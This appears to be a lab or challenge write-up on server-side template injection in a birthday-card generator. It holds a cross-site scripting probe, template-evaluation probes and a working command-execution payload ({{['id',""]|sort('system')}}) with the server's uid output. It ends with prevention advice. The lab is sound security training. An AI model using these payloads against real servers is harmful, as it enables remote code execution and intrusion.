
# 🌐 SSTI 0x02 [Challenge]: Exploring Dual Exploitation Techniques

---

## ❓ Overview of the Lab

This lab provides an environment to explore Server-Side Template Injection (SSTI) using a simple birthday card generator with editable HTML content. There are two distinct methods to achieve SSTI, each leveraging different aspects of the application.

---

## 🛠️ Method 1: Exploitation via Burp Suite

1. **Initial Setup:**
    - **Interface Elements:** Two input fields (Recipient and Sender) and one dropdown (Image) with three buttons (Generate Card, Edit Card, Start Again).
2. **Triggering XSS:**
    - **Action:** Enter `<script>alert(1)</script>` in the editable HTML to confirm basic cross-site scripting vulnerability.
3. **Intercepting and Modifying Requests:**
    - **Tools Used:** Burp Suite for capturing and modifying POST requests.
    - **Procedure:** Intercept the POST request from the "Edit Card" action and send the `cardHtml` parameter to the Repeater and Intruder for further testing.
4. **Fuzzing for SSTI:**
    - **Payload Source:** Load payloads from `template-engines-special-vars.txt`.
    - **Successful Payload:** `{{=42*42}}` which returned significant changes in response size and timing.
5. **Executing the SSTI Payload:**
    - **Payload:** `{{['id',""]|sort('system')}}`
    - **Outcome:** The response displayed server system information, confirming SSTI:
        ```
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        ```

---

## 🛠️ Method 2: Direct HTML Manipulation (Video Walkthrough)

1. **Initial HTML Modification:**
    - **Action:** Modify the HTML directly in the editable section to test template rendering:
        ```html
        <div>
            <h2>Dear john, {{7*7}}</h2>
            <img src="/assets/birthday.png" alt="birthday">
            <p>From west</p>
        </div>
        ```
2. **Testing for Template Engine Execution:**
    - **Outcome:** The number `49` appears in the rendered card, indicating the template engine is processing input.
3. **Injecting SSTI Payload:**
    - **Modified HTML for SSTI:**
        ```html
        <div>
            <h2>Dear john, {{['id',""]|sort('system')}}</h2>
            <img src="/assets/birthday.png" alt="birthday">
            <p>From west</p>
        </div>
        ```
    - **Result:** Similar to Method 1, the payload evaluates to display system user information, confirming SSTI.

---

## 📖 Learning Outcomes

- **Understanding SSTI Vectors:** Demonstrates two different approaches to exploiting SSTI vulnerabilities—through manual HTML manipulation and automated fuzzing via a security tool.
- **Tool Efficiency:** Highlights the use of Burp Suite's capabilities in identifying and exploiting vulnerabilities through methodical testing.
- **Security Implications:** These exercises underscore the importance of sanitizing user input and validating or escaping template data to prevent unauthorized server-side operations.

---

## 🎯 Real-World Implications

- **Potential Risks:** SSTI can lead to severe security breaches, including unauthorized access, data leakage, and even full system control.
- **Prevention Strategies:** Employ rigorous input validation, use secure template settings, and regularly update and audit dependencies and configurations to minimize vulnerabilities.

---
